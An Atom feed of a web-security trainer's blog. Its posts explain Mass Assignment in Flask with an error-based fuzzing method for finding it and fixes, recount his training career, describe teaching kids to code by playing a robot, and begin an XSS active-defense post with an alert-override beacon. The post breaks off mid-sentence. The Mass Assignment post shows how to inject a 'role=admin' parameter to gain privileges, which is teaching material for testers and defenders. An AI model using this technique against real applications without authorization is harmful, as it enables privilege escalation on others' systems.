<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title type="text">Recent Articles</title>
  <id>https://www.lanmaster53.com/atom.xml</id>
  <updated>2019-06-14T00:00:00Z</updated>
  <link href="https://www.lanmaster53.com/" />
  <link href="https://www.lanmaster53.com/atom.xml" rel="self" />
  <author>
    <name>Tim Tomes</name>
  </author>
  <generator>Werkzeug</generator>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Dynamic Discovery of Mass Assignment Vulnerabilities</title>
    <id>https://www.lanmaster53.com/2019/06/14/dynamic-discovery-mass-assignment</id>
    <updated>2019-06-14T00:00:00Z</updated>
    <published>2019-06-14T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2019/06/14/dynamic-discovery-mass-assignment" />
    <content type="html">&lt;p&gt;I love teaching for a lot of reasons. One of the reasons is because I learn so much when I teach. Sounds weird doesn't it? Why would the person teaching be learning? Well, It's probably not what you think. Some of what I learn comes directly from the students, but a lot comes from debugging issues on the fly and some dumb-luck discovery when someone in the class accidentally clicks somewhere or mistypes something. Recently I was teaching a class, and a combination of these led to a pretty neat discovery that I want to share with the community.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;h3&gt;What is Mass Assignment?&lt;/h3&gt;
&lt;p&gt;There's this thing called Mass Assignment. It has other names, which I'll mention later, but for the purposes of this article, we'll call it Mass Assignment. It was originally discovered as an issue with Ruby on Rails active record. It exists where request parameters are bound directly to model objects that are ultimately used to create or update a record in a database. To understand what that actually means, let me back up a bit and explain a few things. In the Model View Controller (MVC) development architectural pattern (most common today), developers often use these things called Object Relational Mappers (ORM). Basically, an ORM abstracts (adds a layer of code) to database interaction so that instead of writing raw SQL queries that Create, Read, Update or Delete (CRUD) data in a table in a database, the developer interacts with objects that are instances of a model. This has many benefits. One being that instead of dynamically mixing user input with pre-built SQL queries, which often leads to SQL injection, user input is passed to the ORM, which safely handles it and prevents injection attacks. In order to make it easier to understand what exactly a model is, think of it as the table schema for a table in a database. It describes the columns (attributes) that make up the rows (objects) in a table (model).&lt;/p&gt;
&lt;p&gt;For example, let's say our table (model) applies this schema:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+-----------------+
|      users      |
+-----------------+
| username | TEXT |
| password | TEXT |
| role     | TEXT |
+-----------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Using an ORM, instead of making a raw query to insert a record into the table like:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;INSERT INTO users (username, password, role) VALUES (&amp;#39;lanmaster53&amp;#39;, &amp;#39;correcthorsebatterystaple&amp;#39;, &amp;#39;user&amp;#39;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The developer can create a new instance of the model (row) and assign values to its attributes (columns) like:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = User()
user = user.username=&amp;#39;lanmaster53&amp;#39;
user = user.password=&amp;#39;correcthorsebatterystaple&amp;#39;
user = user.role=&amp;#39;user&amp;#39;
db.add(user)
db.commit()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = User(username=&amp;#39;lanmaster53&amp;#39;, password=&amp;#39;correcthorsebatterystaple&amp;#39;, role=&amp;#39;user&amp;#39;)
db.add(user)
db.commit()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And a new row is made in the table with the provided attribute values in the corresponding column. All of these examples effectively do the same thing. Hopefully this makes sense, because this is where the issue exists. Let's move forward.&lt;/p&gt;
&lt;p&gt;The attributes in the above code blocks (username, password and role) could also be parameters in a request. Consider the following POST payload:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;username=lanmaster53&amp;amp;password=correcthorsebatterystaple&amp;amp;role=user
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In modern frameworks, a developer would access these values on the server from the request using something like &lt;code&gt;request.form&lt;/code&gt;, which is an array of the name-value pairs. What's also possible in modern frameworks, is the ability to pass an array to a function as is, while signaling to the system that the array should be expanded into name-value pairs and treated as parameters. For example, take the following block of code:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def example(x, y, z):
    #do something with x, y, and z

array = {
    &amp;#39;x&amp;#39;: 1,
    &amp;#39;y&amp;#39;: 2,
    &amp;#39;z&amp;#39;: 3
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This function could be invoked like:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;example(x=array[x], y=array[y], z=array[z])
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But it would be a heck of a lot easier to do something like:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;example(**array)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Which is shorthand for the previous example. Such a nice feature, right!? It exists pretty much everywhere.&lt;/p&gt;
&lt;p&gt;Now look back at our POST payload example above. Some of you may have already picked up on this, but what kind of application allows the user to control what role they get? Not a good one, right? Obviously it depends on the context, but this isn't something that should normally be done. So the POST payload would probably look more like:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;username=lanmaster53&amp;amp;password=correcthorsebatterystaple
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notice the lack of &lt;code&gt;role&lt;/code&gt; parameter. The developer is likely setting the &lt;code&gt;role&lt;/code&gt; attribute to &lt;code&gt;user&lt;/code&gt; on the server because that should be the default state of every new user. That's a good thing. As we already established, the role shouldn't be controlled by the user. But this is where it all comes together. What if the application is using the really nice feature from above (we'll call it Mass Assignment, Autobinding, or Object Injection)? Does it not become possible that we could guess the &lt;code&gt;role=admin&lt;/code&gt; parameter and value and pass that in with the rest of the payload to give ourselves a higher privilege role? Yes! And that's why this is a vulnerability.&lt;/p&gt;
&lt;h3&gt;Mass Assignment in Flask&lt;/h3&gt;
&lt;p&gt;Previously, it seems, this issue has only been widely discussed in the context of Ruby on Rails, NodeJS, Java Spring MVC, ASP.NET MVC and PHP. However, when incorporating this topic into &lt;a href=&quot;https://www.lanmaster53.com/training/&quot;&gt;Practical Web Application Penetration Testing (PWAPT)&lt;/a&gt;, I found a realistic way to introduce and exploit the issue in Flask. What you have seen up to this point is Python code and is exactly how this issue manifests itself in a Flask application.&lt;/p&gt;
&lt;p&gt;I have not been able to find anywhere else on the Internet that includes Flask in the list of affected frameworks, so &lt;strong&gt;consider this a zero-day release of this information&lt;/strong&gt;. I have not mentioned this to the Flask community, and I don't consider this to be an irresponsible disclosure because there's nothing the framework should do about this. These are valid features of both the framework and the ORM (in this case Flask and SQLAlchemy), and developers need to know when, and when not, to use them. More on that in a bit.&lt;/p&gt;
&lt;h3&gt;Dynamic Discovery Methodology&lt;/h3&gt;
&lt;p&gt;After incorporating Mass Assignment into PWAPT, I approached it as something that wasn't really feasible to find dynamically due to the large number of possibilities (parameter names and value data types) and a lack of meaningful responses. Traditionally, servers just drop unrecognized parameters and don't behave any differently as a result. So I've skipped over it when we were short on time, or glazed over it quickly with the reasoning that it required source code to find. But, remember all the way back up at the top of this article where I said I love to teach because I learn things? I recently had enough time to fully cover this issue with a class and a few of my students, Cal B. (@y0ucancallmecal) and Hitesh Khurana (@tesh_kh), fuzzed the vulnerable resource and noticed some things that I think will be universally applicable in finding Mass Assignment issues dynamically, perhaps even by a Dynamic Application Security Testing (DAST) solution (automated scanner).&lt;/p&gt;
&lt;p&gt;Ultimately, the simplest form of Mass Assignment stems from mapping request parameters directly to the creation of an internal object by passing the serialized parameters directly to the class declaration, as we saw above. Well, when the serialized parameters are passed to the ORM to create or update an object, the ORM expects specific attribute names and data types according to the model, just like a database table would. What my students uncovered was that by providing arbitrary parameters (attributes the ORM didn’t expect), and values of varying data types for known attributes, they could cause the server to return errors. It just so happens that those errors allowed for the discovery and enumeration of the parameter (attribute) name and value data type needed to exploit the issue, without access to the source code. Based on the students' discovery and my understanding of what the application was saying through the errors it was returning, I came up with the following methodology for dynamic discovery of Mass Assignment.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Identify possible targets (requests that appear to impact an update or create operation on the server).&lt;/li&gt;
&lt;li&gt;Add arbitrary parameters to the existing parameters (body, query string, JSON, XML, whatever, but the two previous are the most likely candidates).&lt;/li&gt;
&lt;li&gt;If the server responds with an error related to an unknown attribute, argument, parameter, etc., then the parameter name is wrong.
    &lt;a href=&quot;/static/images/posts/2019-06-14-dynamic-discovery-mass-assignment/mass-assign-bad-param.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;/static/images/posts/2019-06-14-dynamic-discovery-mass-assignment/mass-assign-bad-param.png&quot; /&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Fuzz the parameter name until something changes. A successfully guessed parameter name will either work if the data type of the value is correct, or throw a second error related to a mismatched or unexpected data type.
    &lt;a href=&quot;/static/images/posts/2019-06-14-dynamic-discovery-mass-assignment/mass-assign-bad-type.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;/static/images/posts/2019-06-14-dynamic-discovery-mass-assignment/mass-assign-bad-type.png&quot; /&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;If the server responds with an error related to a mismatched or unexpected data type, fuzz the parameter value for different data types (integers, strings, etc.). The error may even state what is expected, like the image above.&lt;/li&gt;
&lt;li&gt;When the server stops responding with an error condition, the parameter name and value data type have been enumerated. Go forth and exploit.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Obviously, this assumes some sort of error response to varying input. Finding Mass Assignment without errors (blind) would take me back to my original line of thinking that it is infeasible because there is no way to confirm control over the operation until complete success. I’m still digging into blind discovery, but this is where I stand at the moment.&lt;/p&gt;
&lt;p&gt;If you're wondering how applicable this methodology is across other technology stacks, it has been tested on both Flask and Ruby on Rails, and in both instances, the errors returned by the application included messaging eluding to unrecognized attributes for attribute enumeration, and incorrect data type for value data type enumeration. This is very promising and I expect to see similar results most everywhere. Please share your discoveries.&lt;/p&gt;
&lt;p&gt;As far as scanners go, I see this being implemented as an injection check. All applications take the same kind of stuff: POST payloads, query strings, JSON or XML. Arbitrary parameters and varying data types are universal. Based on my knowledge of how ORMs work in general, this methodology should cause an exception in any implementation, and when it isn’t caught and handled by the developer, the scanner should be able to detect and report a potential issue using error-based analysis.&lt;/p&gt;
&lt;p&gt;I spoke with James Kettle (@albinowax) from the Portswigger R&amp;amp;D team about all of this. He agreed that it seems like a feasible technique, but also said that the Burp DAST does not check for this and made no indication that it would. I assume due to the variable error responses that are possible across server-side technologies. However, James did mention that his Param Miner extension uses some of this behavior to elicit meaningful responses and may help identify the issue. I tested this myself and was unable to get the extension to identify the specific instance of the vulnerability I was testing against. However, the target vulnerability was a registration page that required unique information in specific parameters on every request. Param Miner did not appear to have the configuration options available to do this, but I suspect in other less restricted instances, it will help. As for now, this is yet another reason to have your applications manually analyzed by a trained professional, and not lean solely on a DAST solution.&lt;/p&gt;
&lt;h3&gt;Remediation&lt;/h3&gt;
&lt;p&gt;As always, I don't like explaining why something is broken without providing a means to do it safely. There are a few ways to create or update model objects safely.&lt;/p&gt;
&lt;p&gt;First, validate input. Applications should always validate input, whether using it as a security control or not. However, in this case, validate provided parameters against a list of expected model attributes. Validation can be done by blacklisting (nonassignable attributes) or whitelisting (assignable attributes), but the validator must be updated any time the affected model changes, and will be unique for every form.&lt;/p&gt;
&lt;p&gt;Second, explicitly bind parameters to the model object. Given the example above, it would look something like this:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;user = User()
user = user.username=request.form[&amp;#39;username&amp;#39;]
user = user.password=request.form[&amp;#39;password&amp;#39;]
db.add(user)
db.commit()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notice the application is not blindly trusting user input with regards to parameter names (username and password). The application avoids using the binding shortcut and does things explicitly.&lt;/p&gt;
&lt;p&gt;Lastly, bind to a Data Transfer Object (DTO) before binding to the final object. DTOs are intermediate objects consisting of an assignable subset of the target object's attributes. It acts as a kind of filter. So first, bind the DTO to the untrusted input, then bind the object to the DTO. This provides similar behavior to that of whitelisting parameter names as it will only use the parameters matching the names of expected attributes.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">A Decade of Training</title>
    <id>https://www.lanmaster53.com/2019/02/22/a-decade-of-training</id>
    <updated>2019-02-22T00:00:00Z</updated>
    <published>2019-02-22T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2019/02/22/a-decade-of-training" />
    <content type="html">&lt;p&gt;Training has been a significant part of my professional life since 2009. I've never written about my training pursuits, so as I march into my tenth year of training, fifth year of Practical Web Application Penetration Testing (PWAPT), and the first year of Practical Burp Suite Pro: Advanced Tactics (PBAT), I'd like to share a little about where I've been, where I'm at, and where I'm going, while specifically addressing my various courses.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;p&gt;I started my training career in 2009 organizing the &quot;255S Course&quot;: the Army's attempt at building the ideal Cyber Defender. This came on the heels of being an Army Red Team leader for a couple years, so I was a good fit for the role. You know the saying, the best defense is knowing your opponent's offense. Well, I had the opportunity to work with Chris Gates (@carnal0wnage), Matt Graeber (@mattifestation) and Chris Campbell (@obscuresec) on the Army Red Team, so you could say I learned a thing or two about offense.&lt;/p&gt;
&lt;p&gt;I made my first personal venture in the classroom putting together a small Python for Pentesters class for the 255S course. However, I needed a LOT of help with other topics such as digital forensics, incident handling/response, packet analysis, Windows/Linux security, etc. So I formed a relationship with SANS to help me fill those needs.&lt;/p&gt;
&lt;p&gt;It was early in my relationship with SANS that I became friends with John Strand (@strandjs). John introduced me to the training industry and mentored me into becoming an instructor for SANS. It was with John at BHIS that I also began to focus exclusively on Web Application Security. Therefore, SANS SEC542 was a natural fit and that is where I enjoyed my first public classroom experiences.&lt;/p&gt;
&lt;p&gt;Teaching SEC542 for SANS worked out great for several years, but I had no control over the content I was teaching at SANS, and there was so much more that I wanted to share. The only option that afforded me complete control over the content I was teaching was to branch off on my own. So that's what I did.&lt;/p&gt;
&lt;p&gt;PWAPT was initially designed in 2015 as a follow-on for SANS SEC542. When I was teaching for SANS, I noticed a gap between where students were after SEC542 and where they needed to be to conduct successful web application penetration tests. While the basic vulnerability theory was there in SEC542, how to apply it was lacking. Therefore, with PWAPT I was less interested in the vulnerabilities and more interested in the process and tooling for bringing it all together to conduct a successful test. To support this effort, version 1 of PWAPT leveraged an old server-side PHP application with traditional vulnerabilities that didn't offer much for exploration outside of the OWASP Top 10. Since I wasn't focused on vulnerabilities, the target application provided a good foundation for this early version of the class.&lt;/p&gt;
&lt;p&gt;Soon after I began teaching PWAPT, I realized the need to focus at least some effort on vulnerabilities. I was getting a lot of students that had never taken SANS SEC542 and were missing the fundamentals required for the original vision of PWAPT. Therefore, I began building version 2 of PWAPT alongside a modern web application that leveraged Python Flask. The application was named PwnedHub and was built as &quot;a service for hosted vulnerability scanning.&quot; Using a server-side rendered MVC framework provided a more realistic experience for students and better replicated real world applications that students could expect to see during the majority of their engagements. While the core focus of the course remained on process and tooling, I began incorporating vulnerability theory. However, I didn't restrict myself to the OWASP Top 10. I immediately expanded the content to include things like Server-Side Template Injection (SSTI), Mass Assignment, Server-Side Request Forgery (SSRF), etc. but PwnedHub was limited to vulnerabilities specific to server-side rendered applications.&lt;/p&gt;
&lt;p&gt;As Single Page Applications (SPA) became a prominent architectural design pattern, it became important to begin incorporating client-side rendering as a major component of the PwnedHub application and PWAPT course material. Version 3 of PWAPT saw PwnedHub offer several pages rendered as SPAs written in React. This provided an opportunity to explore vulnerabilities in client-side rendering and REST web services as well as the process and tooling for testing them. Topics such as DOM-based Cross-Site Scripting (D-XSS), the impact of mismatched content types, REST authentication mechanisms, and Cross-Origin Resource Sharing (CORS) were added to the course content. The SPA components were eventually rewritten in Vue.js, but the course material around testing SPAs remained the same. Version 3 of PWAPT also saw the transition from Burp Suite Pro v1 to v2 beta and the implementation of my proprietary training content management and delivery platform.&lt;/p&gt;
&lt;p&gt;With version 4 of PWAPT (finished this week), the transition to Burp Suite Pro v2 beta continues and will likely include the full transition to the Burp Suite Pro v2 release in the coming months (hopefully). Version 4 also takes a special interest in business logic vulnerabilities. This required a complete redesign of the PwnedHub application, which is now &quot;a consolidated bug bounty and hosted scanning platform.&quot; While PwnedHub still includes re-skinned and enhanced versions of previous functionality, it's main business purpose is the one-of-a-kind bug bounty system that crowd sources the bug validation phase of bug bounties in addition to the actual discovery. As you can imagine, this provides all kinds of opportunities to introduce true business logic issues. Students are going to thoroughly enjoy the challenge of what I have in store for them.&lt;/p&gt;
&lt;p&gt;The last four paragraphs covered four years, during which PWAPT was my sole training effort. I maintained PWAPT pretty much on a daily basis, and that will continue. I believe in the purpose of PWAPT, and the over 600 people that have been trained by PWAPT up to this point can provide testimony to its value. I won't compromise that and you can expect a fresh experience if you come back and take the course every other year. Many have, and many still do. But I'm not stopping there. I created Practical Security Services (PractiSec) in late 2017 to offer training in a more official capacity. While that's been a whole 'nother experience that I won't cover here, I do want to be clear about my intent for the future. I intend for PractiSec to be a training first, consulting second, practice built on the backs of classes like PWAPT. There is a desperate need for affordable world-class training, and I want to help meet that need. Last year I announced a new course in PBAT, and more will follow as gaps and needs are identified. And while I am focused on web application security now, I won't rule out bringing in other subject matter experts to teach courses based on practical skills in other disciplines.&lt;/p&gt;
&lt;p&gt;Specifically regarding PBAT, I mentioned last year that I hope to have it done by Spring of 2019. While I am still on track to meet that timeline, the first two places I've submitted to teach it rejected my Call-for-Training (CFT) submission. I am still holding out hope that the last year for DerbyCon will be the first presentation for PBAT, but I won't know for a few months. If you are interested in hosting a PBAT class, please see the &lt;a href=&quot;/training&quot;&gt;training page&lt;/a&gt; for details or &lt;a href=&quot;/contact&quot;&gt;contact&lt;/a&gt; me directly. If you're wondering what PBAT is, that is also on the training page.&lt;/p&gt;
&lt;p&gt;I have thoroughly enjoyed sharing my passion through training over the past ten years, and I'm excited about what the future holds for my training pursuits. If you've joined me for a class before, thank you for your support and I hope to see you again. If you haven't attended one of my courses, then I hope to see you at a future event now that you know a little more about the history of what you'll be receiving.&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">Get Off Your Butt and Teach Your Kids to Code</title>
    <id>https://www.lanmaster53.com/2018/12/08/get-off-your-butt-and-teach-your-kids-to-code</id>
    <updated>2018-12-08T00:00:00Z</updated>
    <published>2018-12-08T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2018/12/08/get-off-your-butt-and-teach-your-kids-to-code" />
    <content type="html">&lt;p&gt;If you're my age (born in the early 1980s) and know how to code, then it has likely been a differentiator for you in your career. I can't think of a single thing I've done professionally where my ability to understand programming concepts and write code has not benefited me in some way. However, coding is fast becoming a more common skill set amongst the younger generations. Teaching our kids to code is now more of a necessity and less of a luxury.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;p&gt;Today was the start of Snowmageddon 2018 (not really, this is SC and there might be some freezing rain). It was cold and wet outside and everyone was holed up indoors. Kids were restless and parents were on edge. I was getting some prep work done for a class I'm teaching next week when my four year old daughter walked in, picked up a box, and placed it on my head. I immediately felt like a robot and started making robot sounds and noises. Then it hit me... The ideas rushed in and before I could get in another beep-boop, I had put together a progressive plan for teaching my kids to code using me as a robot.&lt;/p&gt;
&lt;p&gt;Normally I wouldn't write about something like this, but it worked out so well that I wanted to share it in hopes that not only would it give parents an interesting way to teach code, but also get them off their butts and interacting with their children in a more physical way as opposed to sitting in front of a computer or TV screen.&lt;/p&gt;
&lt;p&gt;So here's how it unfolded.&lt;/p&gt;
&lt;p&gt;As the robot, I got to be as flexible or rigid with following the commands as the child needed for their ability level. I also got to make up funny responses on the fly to bad commands that I knew would fail, and commands that ended badly by running into furniture and stubbing my toes on door jams. Don't let me downplay the importance of actually having a box for a robot head. With no eye holes I might add. It kept me honest, and gave the kids another reason to be creative. My ten year old went as far as to draw a face on it for me and name me. I can't remember what she named me because my wife quickly changed the name to &quot;Pain in the Bot&quot; and it stuck.&lt;/p&gt;
&lt;p&gt;Level 1 was very simple. Even my four year old could do this. I gave the kids a very simple task that involved moving about the house i.e. &quot;get me from my desk chair to the bathroom&quot;. All commands were given verbally. The children took turns and I followed the commands exactly. I gave very little coaching at this level and just let them get use to giving me commands and discovering how I would respond. Most commands were something like &quot;10 steps forward&quot; and &quot;turn left&quot;. Nothing too complex.&lt;/p&gt;
&lt;p&gt;Level 2 was also verbal, but I ramped up the complexity and coaching. The command &quot;10 steps forward&quot; signifies a looping construct, so I began coaching them to say stuff like, &quot;count from 1 to 10 and take a step on each count&quot;. I also introduced them to conditions. I coached them into commands like &quot;until the floor is hard, take steps&quot; which would cause me to walk across the carpet until I hit the hardwood floor. Another example would be &quot;until in the kitchen, take steps&quot; which would cause me to walk through the living room until I hit the other side of the kitchen threshold. The kids started using degrees of turns as well instead of simple &quot;left&quot; and &quot;right&quot; commands.&lt;/p&gt;
&lt;p&gt;Level 3 is where things really got fun. Rather than follow commands one at a time, I gave the children a simple task and had them begin to plan on their own using paper, building a list commands they thought would get the task done. At this time they had a decent understanding of the syntax I'd been using and the available commands and constructs. Once they had a &quot;script&quot; built, I took the script and followed it exactly. Like all code, it never compiled or executed perfectly the first time. There were bugs. Spelling errors caused me to not understand a command. I didn't take enough steps and ended up facing a wall, unable to continue. I tripped over some obstruction in the way that they didn't account for and it threw me off track. When these kinds of things happened, I would let them debug, modify the code, and start execution all over again when they were ready. We did this until the task was complete.&lt;/p&gt;
&lt;p&gt;This is where we left off. It was a ton of fun, took a good bit of time, and everyone walked away unscathed... except for a few bruises and broken toes (I was dedicated to the part). I will eventually parlay this into something more closely tied to computer programming, but this was a great way to introduce my children to programming concepts, even though they have no idea that's what they were doing. &lt;/p&gt;
&lt;p&gt;I'd love to hear some feedback on this. Especially if you have ideas on ways to make it better, or other examples of ways to introduce more complex constructs like functions, etc. Let me know what you come up with!&lt;/p&gt;</content>
  </entry>
  <entry xml:base="https://www.lanmaster53.com/atom.xml">
    <title type="text">XSS Active Defense</title>
    <id>https://www.lanmaster53.com/2018/06/18/xss-active-defense</id>
    <updated>2018-06-18T00:00:00Z</updated>
    <published>2018-06-18T00:00:00Z</published>
    <link href="https://www.lanmaster53.com/2018/06/18/xss-active-defense" />
    <content type="html">&lt;p&gt;While I don't do active defense in any part of my professional life, I enjoy developing active defense techniques for web technologies. Lately I've been dabbling in active defense mechanisms for Cross-Site Scripting (XSS) attacks, and as the developer of the HoneyBadger geolocation framework, incorporating the research into new reporting techniques and agents.&lt;/p&gt;
&lt;!-- READMORE --&gt;

&lt;p&gt;First, the basics. XSS is a client-side code injection issue where the goal is to inject client-side code in such a way that a malicious payload executes in the JavaScript context, regardless of where the payload lands in the page. The bottom line is that the final attack executes as JavaScript. When attempting to discover XSS flaws, an attacker is always going to develop proof-of-concept payloads to validate the issue prior final exploitation. This is a universal methodology. The first active defense technique I want to share preys on this universal behavior.&lt;/p&gt;
&lt;p&gt;The most common proof-of-concept payload used during the discovery process is typically some variation of the &lt;code&gt;alert&lt;/code&gt; JavaScript function, regardless of the context. I understand that there are many options with which to conduct a proof-of-concept attack, but this technique applies to all of them and for this demonstration we're going to use &lt;code&gt;alert&lt;/code&gt;. Like many other programming/scripting languages like it, we have the ability to overwrite functions in JavaScript. If we know that an attacker is going to use the &lt;code&gt;alert&lt;/code&gt; function to create a proof-of-concept while validating XSS on a target application, then the &lt;code&gt;alert&lt;/code&gt; function itself becomes an opportunity for detection and action when we apply what we know about JavaScript. Take the following block of code:&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_alert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// report malicious behavior&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;_alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This code saves the original &lt;code&gt;alert&lt;/code&gt; function as &lt;code&gt;_alert&lt;/code&gt;. The code then creates a new &lt;code&gt;alert&lt;/code&gt; function. The new &lt;code&gt;alert&lt;/code&gt; function does anything we want whenever the browser calls it, and then initiates the original behavior by calling &lt;code&gt;_alert&lt;/code&gt;. Since the &lt;code&gt;alert&lt;/code&gt; function usually indicates malicious behavior, this gives us an opportunity to detect an attack, and in the case of active defense, respond with some action of our own. Let's expand on the above code to do something interesting.&lt;/p&gt;
&lt;div class=&quot;codehilite&quot;&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_alert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;https://&amp;lt;honeybadger host&amp;gt;/api/beacon/&amp;lt;target guid&amp;gt;/HTML&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;_alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The added code is a HoneyBadger HTML agent using a JavaScript image object. The cool thing about creating an image this way is that browsers immediately fire off the request for the &lt;code&gt;src&lt;/code&gt; as soon as it is set, and the image never has to be added to the DOM. This means there is no visual evidence of attack in the user interface. As it stands right now, there are a variety of agents that we could place in our fake &lt;code&gt;alert&lt;/code&gt; function, i.e. HTML, JavaScript (HTML5), Java Applet, etc., but you can literally do anything you'd like. Pretty cool, right?&lt;/p&gt;
&lt;p&gt;Beyond overwriting the &lt;code&gt;alert&lt;/code&gt; function, there are a few other XSS specific HoneyBadger agents that I've come up with recently: Content-Security-Policy and XSS-Protection. Both of these agents incorporate reporting functionality for debugging issues during the implementation process. However, defenders can use the reporting functionality built into these mechanisms to report back to say... a HoneyBadger server.&lt;/p&gt;
&lt;p&gt;The Content-Security-Policy agent reports upon any violation of the configured policy, which when done correctly indicates the introduction of arbitrary client-side code. Incorporating either of these agents into a web page requires the ability to set headers for the page's response. The following headers create the Content-Security-Policy agent:&lt;/p&gt;
